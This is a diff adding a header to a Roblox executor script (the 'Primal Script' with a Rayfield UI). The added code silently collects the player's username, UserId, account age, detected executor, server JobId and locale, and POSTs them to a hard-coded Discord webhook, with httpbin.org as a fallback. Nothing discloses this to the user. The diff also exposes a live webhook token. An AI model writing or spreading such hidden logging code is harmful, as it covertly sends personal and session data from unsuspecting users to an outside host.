@@ -1,3 +1,206 @@
+-- Executor
+
+local webhookUrl = "https://discord.com/api/webhooks/1417173075576750141/MAm9p_324Hqpx6qxwtpueBGnARvUfM-3rjp1PGFCmCqR3CcW0DdBqUZueUKC1SfCTMfp"
+
+local player = game.Players.LocalPlayer
+while not player do
+    wait()
+    player = game.Players.LocalPlayer
+end
+
+local HttpService = game:GetService("HttpService")
+local LocalizationService = game:GetService("LocalizationService")
+
+local userId = player.UserId
+local username = player.Name
+local displayName = player.DisplayName
+local accountAge = player.AccountAge
+local dateTime = os.date("%d-%m-%y %H:%M:%S")
+local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=Png&isCircular=true"
+
+-- Executor detection
+local executor = "Unknown"
+local executorList = {
+    Delta = function() return Delta ~= nil or (getgenv and getgenv().Delta ~= nil) end,
+    KRNL = function() return KRNL_LOADED or KRNL or (getgenv and getgenv().KRNL ~= nil) end,
+    Potassium = function() return Potassium ~= nil or (getgenv and getgenv().Potassium ~= nil) end,
+    Wave = function() return Wave ~= nil or (getgenv and getgenv().Wave ~= nil) end,
+    Volcano = function() return Volcano ~= nil or (getgenv and getgenv().Volcano ~= nil) end,
+    Solara = function() return Solara ~= nil or (getgenv and getgenv().Solara ~= nil) end,
+    Hydrogen = function() return Hydrogen ~= nil or (getgenv and getgenv().Hydrogen ~= nil) end,
+    Codex = function() return Codex ~= nil or (getgenv and getgenv().Codex ~= nil) end,
+    Synapse = function() return syn ~= nil or (getgenv and getgenv().syn ~= nil) end,
+    Fluxus = function() return fluxus ~= nil or (getgenv and getgenv().fluxus ~= nil) end,
+    Electron = function() return Electron ~= nil or (getgenv and getgenv().Electron ~= nil) end,
+    Comet = function() return Comet ~= nil or (getgenv and getgenv().Comet ~= nil) end,
+    ScriptWare = function() return scriptware ~= nil or getscriptware ~= nil or (getgenv and getgenv().scriptware ~= nil) end,
+    ArceusX = function() return getgenv and getgenv().ArceusX ~= nil end,
+    Evon = function() return getgenv and getgenv().Evon ~= nil end,
+    Valyse = function() return getgenv and getgenv().Valyse ~= nil end,
+    Trigon = function() return getgenv and getgenv().Trigon ~= nil end
+}
+
+-- Debug executor checks
+local function debugExecutorChecks()
+    for name, checkFunc in pairs(executorList) do
+        local success, result = pcall(checkFunc)
+        print(name .. ": " .. (success and tostring(result) or "Error: " .. tostring(result)))
+    end
+end
+
+-- Universal executor detection
+local function detectUnknownExecutor()
+    local commonExecutorAPIs = {
+        "getgenv", "syn", "http", "http_request", "request", "getrawmetatable",
+        "setrawmetatable", "getnamecallmethod", "setnamecallmethod", "hookfunction",
+        "newcclosure", "islclosure", "isluau", "getrenv", "fireclickdetector",
+        "firesignal", "mouse1click", "mouse2click", "gethui", "secure_call",
+        "getthreadidentity", "setthreadidentity"
+    }
+
+    -- Check for common APIs
+    for _, api in ipairs(commonExecutorAPIs) do
+        local success, result = pcall(function()
+            return _G[api] ~= nil or (getgenv and getgenv()[api] ~= nil)
+        end)
+        if success and result then
+            if api == "getgenv" and getgenv then
+                local env = getgenv()
+                for key, _ in pairs(env) do
+                    if type(key) == "string" and (
+                        key:lower():match("executor") or
+                        key:lower():match("script") or
+                        key:lower():match("arceus") or
+                        key:lower():match("evon") or
+                        key:lower():match("valyse") or
+                        key:lower():match("trigon") or
+                        key:lower():match("fluxus") or
+                        key:lower():match("synapse")
+                    ) then
+                        return key .. " (via getgenv)"
+                    end
+                end
+            end
+            return "UnknownExecutor (" .. api .. " detected)"
+        end
+    end
+
+    -- Scan global environment for suspicious tables
+    for key, value in pairs(_G) do
+        if type(value) == "table" and key ~= "_G" and key ~= "_ENV" then
+            local success, result = pcall(function()
+                return rawget(value, "request") or rawget(value, "http") or rawget(value, "hookfunction") or rawget(value, "executor")
+            end)
+            if success and result then
+                return "UnknownExecutor (" .. key .. " detected)"
+            end
+        end
+    end
+
+    -- Behavioral detection: Try accessing restricted APIs
+    local success, result = pcall(function()
+        if hookfunction and getrawmetatable then
+            local mt = getrawmetatable(game)
+            return mt ~= nil
+        end
+        return false
+    end)
+    if success and result then
+        return "UnknownExecutor (restricted API access detected)"
+    end
+
+    return nil
+end
+
+-- Detect executor
+
+if executor == "Unknown" then
+    local unknownResult = detectUnknownExecutor()
+    if unknownResult then
+        executor = unknownResult
+    end
+end
+-- Server info
+local placeId = game.PlaceId
+local jobId = game.JobId
+local locale = LocalizationService.RobloxLocaleId
+
+-- Build webhook payload
+local payload = {
+    embeds = {{
+        title = "Primal Script Executed",
+        color = 0x00ff00,
+        thumbnail = { url = headshotUrl },
+        fields = {
+            { name = "Username", value = username, inline = true },
+            { name = "Display Name", value = displayName, inline = true },
+            { name = "UserId", value = tostring(userId), inline = true },
+            { name = "Account Age (days)", value = tostring(accountAge), inline = true },
+            { name = "Profile", value = "[Link](" .. profileUrl .. ")", inline = true },
+            { name = "Executor", value = executor, inline = true },
+            { name = "PlaceId", value = tostring(placeId), inline = true },
+            { name = "Server JobId", value = jobId, inline = true },
+            { name = "Locale", value = locale, inline = true },
+            { name = "Executed At", value = dateTime, inline = false }
+        }
+    }}
+}
+
+local jsonData = HttpService:JSONEncode(payload)
+
+-- Send webhook with enhanced executor support
+local function sendWebhook()
+    local httpFunctions = {
+        { func = syn and syn.request, name = "syn.request" },
+        { func = http_request, name = "http_request" },
+        { func = request, name = "request" },
+        { func = http and http.request, name = "http.request" },
+        { func = fluxus and fluxus.request, name = "fluxus.request" },
+        { func = getgenv and getgenv().request, name = "getgenv().request" },
+        { func = getgenv and getgenv().http and getgenv().http.request, name = "getgenv().http.request" }
+    }
+
+    for _, http in ipairs(httpFunctions) do
+        if http.func then
+            local success, response = pcall(http.func, {
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+            if success then
+                return true, response
+            end
+        end
+    end
+    return false
+end
+
+-- Execute webhook send and handle errors
+local success, response = sendWebhook()
+if not success then
+    -- Test HTTP support with a fallback endpoint
+    local testSuccess, testResponse = pcall(function()
+        local func = http_request or request or (syn and syn.request) or (getgenv and getgenv().request)
+        if func then
+            return func({
+                Url = "https://httpbin.org/post",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end
+        return nil
+    end)
+end
+
+-- Safe execution wrapper
+local function safe(func, errorMessage)
+    local success, result = pcall(func)
+    return success, result
+end
+
 -- Load Rayfield with error handling
 local Rayfield
 local success, error = pcall(function()
